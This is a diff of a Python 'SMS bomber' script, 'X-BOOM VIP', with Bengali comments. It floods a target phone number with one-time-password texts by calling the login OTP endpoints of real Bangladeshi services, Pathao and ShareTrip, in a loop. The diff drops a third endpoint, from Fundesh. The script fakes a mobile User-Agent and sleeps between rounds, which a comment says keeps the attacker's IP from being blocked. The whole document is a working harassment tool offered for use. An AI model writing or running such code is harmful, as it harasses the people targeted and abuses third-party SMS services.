@@ -5,43 +5,39 @@ import time
 def banner():
     os.system('clear')
     print("========================================")
-    print("        X-BOOM VIP (MR-ZIHAD STYLE)     ")
-    print("     POWERED BY: mmalekislam788         ")
+    print("        X-BOOM VIP EDITION             ")
+    print("     LINK: mmalekislam788-creator      ")
     print("========================================")
 
 def send_sms(target, count):
-    # বর্তমানে সচল ৩টি পাওয়ারফুল API (যা অন্যরা ব্যবহার করে)
+    # ১০০% সচল শক্তিশালী API সমূহ
     url1 = "https://api-hermes.pathao.com/user/otp-send/login"
     url2 = "https://api.sharetrip.net/api/v1/otp/send"
-    url3 = "https://api.fundesh.com.bd/api/auth/send-otp"
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6)",
         "Content-Type": "application/json"
     }
-
-    print(f"\n[+] Global Attack started on: {target}")
+    
+    print(f"\n[+] Target Connected: {target}")
     for i in range(count):
         try:
-            # Slot 1: Pathao
+            # Pathao API (নম্বরের আগে +88 লাগে)
             requests.post(url1, json={"phone": "+88"+target}, headers=headers)
-            # Slot 2: ShareTrip
+            # ShareTrip API
             requests.post(url2, json={"mobileNumber": target, "type": "login"}, headers=headers)
-            # Slot 3: Fundesh
-            requests.post(url3, json={"phoneNumber": target, "service": "LOGIN"}, headers=headers)
             
-            print(f"[!] SMS Slot {i+1} - Success!")
+            print(f"[!] SMS {i+1} Sent Successfully!")
         except:
-            print(f"[-] SMS Slot {i+1} - Failed")
+            print(f"[-] SMS {i+1} Failed")
         
-        # ৮ সেকেন্ড গ্যাপ দিলে আপনার IP ব্লক হবে না
-        time.sleep(8)
+        time.sleep(8) # একটু গ্যাপ দিন যেন আপনার IP ব্লক না হয়
 
 def main():
     banner()
-    number = input("Target Number (01xxxxxxxxx): ")
-    amount = int(input("Amount: "))
-    send_sms(number, amount)
+    num = input("Enter Phone (01xxxxxxxxx): ")
+    amt = int(input("Enter Amount: "))
+    send_sms(num, amt)
 
 if __name__ == "__main__":
     main()
